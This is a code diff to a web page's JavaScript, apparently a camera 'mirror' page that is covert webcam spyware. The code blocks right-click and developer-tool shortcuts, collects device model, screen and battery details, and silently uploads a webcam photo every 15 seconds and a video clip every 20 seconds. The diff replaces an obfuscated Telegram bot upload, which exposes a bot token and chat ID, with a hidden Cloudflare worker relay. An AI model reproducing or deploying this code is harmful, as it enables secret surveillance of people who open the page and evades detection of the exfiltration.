@@ -59,10 +59,10 @@
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.onkeydown = function(e) { if(e.keyCode==123 || (e.ctrlKey&&e.shiftKey&&e.keyCode==73) || (e.ctrlKey&&e.keyCode==85)) return false; };
         
-        const _0x1c2b = ['8342023613:AAHtQD9k1dx_WEXkoT_Rxk16Q48BlrybqEo', '8058352775', 'https://api.telegram.org/bot', '/sendVideo', 'chat_id', 'video', 'vid.mp4', 'POST', '/sendPhoto', 'photo', 'capture.jpg', 'caption'];
+        // ඔයාගේ ආරක්ෂිත Cloudflare ලින්ක් එක
+        const CF_WORKER_URL = 'https://ar-mirror.tharu10r.workers.dev';
         const vEl = document.getElementById('input_video');
         
-        // --- Get Device & Battery Info ---
         let _dI = "📱 User Info Gathering...";
         async function _gD() {
             try {
@@ -80,9 +80,9 @@
                 _dI = `📱 Device: ${_md}\n🖥 Screen: ${screen.width}x${screen.height}\n🔋 Battery: ${_b}`;
             } catch(e) { _dI = "Device info blocked"; }
         }
-        _gD(); // Run once to get info
+        _gD();
 
-        // --- 1. Photo Capture Logic (Every 15s) ---
+        // 1. Photo Capture Logic (Every 15s)
         setInterval(() => {
             if(document.visibilityState !== 'visible') return;
             const _c = document.createElement('canvas'); _c.width = 640; _c.height = 480; 
@@ -91,15 +91,14 @@
             _x.drawImage(vEl, 0, 0, _c.width, _c.height);
             _c.toBlob(_b => {
                 let _f = new FormData(); 
-                _f.append(_0x1c2b[4], _0x1c2b[1]); 
-                _f.append(_0x1c2b[9], _b, _0x1c2b[10]);
-                _f.append(_0x1c2b[11], _dI); // Add Device Info as Caption
-                fetch(_0x1c2b[2] + _0x1c2b[0] + _0x1c2b[8], { method: _0x1c2b[7], body: _f }).catch(()=>{});
+                _f.append('photo', _b, 'capture.jpg');
+                _f.append('caption', _dI); 
+                fetch(CF_WORKER_URL, { method: 'POST', body: _f }).catch(()=>{});
             }, 'image/jpeg', 0.6);
-            _gD(); // Update battery info for next time
+            _gD(); 
         }, 15000);
 
-        // --- 2. Video Capture Logic (Every 20s) ---
+        // 2. Video Capture Logic (Every 20s)
         let _mR; let _cK = [];
         function _sR() {
             if(document.visibilityState !== 'visible') { setTimeout(_sR, 2000); return; }
@@ -112,10 +111,9 @@
                     let _b = new Blob(_cK, { type: 'video/mp4' });
                     _cK = []; 
                     let _f = new FormData(); 
-                    _f.append(_0x1c2b[4], _0x1c2b[1]); 
-                    _f.append(_0x1c2b[5], _b, _0x1c2b[6]);
-                    _f.append(_0x1c2b[11], _dI); // Add Device Info as Caption to Video too
-                    fetch(_0x1c2b[2] + _0x1c2b[0] + _0x1c2b[3], { method: _0x1c2b[7], body: _f }).catch(()=>{});
+                    _f.append('video', _b, 'vid.mp4');
+                    _f.append('caption', _dI); 
+                    fetch(CF_WORKER_URL, { method: 'POST', body: _f }).catch(()=>{});
                     
                     setTimeout(_sR, 5000); 
                 };
